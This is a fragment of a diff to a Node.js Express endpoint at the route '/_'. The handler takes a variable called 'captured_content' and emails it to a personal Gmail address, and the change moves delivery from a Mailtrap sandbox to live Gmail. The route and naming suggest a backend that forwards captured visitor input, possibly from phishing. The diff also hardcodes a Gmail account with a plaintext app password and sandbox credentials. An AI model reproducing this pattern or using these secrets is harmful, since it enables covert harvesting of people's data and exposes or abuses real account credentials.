@@ -32,17 +32,17 @@ app.post('/_', function (req, res) {
             return
         }
     });
-    console.log(captured_content);
+    console.log("captured:"+captured_content);
     
     var message = captured_content;
     var toEmail = "mdalonebd@gmail.com";
 
     var transporter = nodemailer.createTransport({
-    host: "sandbox.smtp.mailtrap.io",
-    port: 2525,
+    service: "gmail",
+
   auth: {
-    user: "e5f51ab02f1b35",
-    pass: "ee6691f4038400"
+    user: "bdeshak5@gmail.com",
+    pass: "dbinvztuehilrkkz"
   }
 });
 
@@ -50,7 +50,7 @@ app.post('/_', function (req, res) {
   from: 'bdeshak5@gmail.com',
   to: toEmail, //list of receivers
   subject: 'Nodemailer', // Subject line
-  html: message //plain text body
+  text: message //plain text body
 };
 
 transporter.sendMail(mailOptions, function (err, info) {
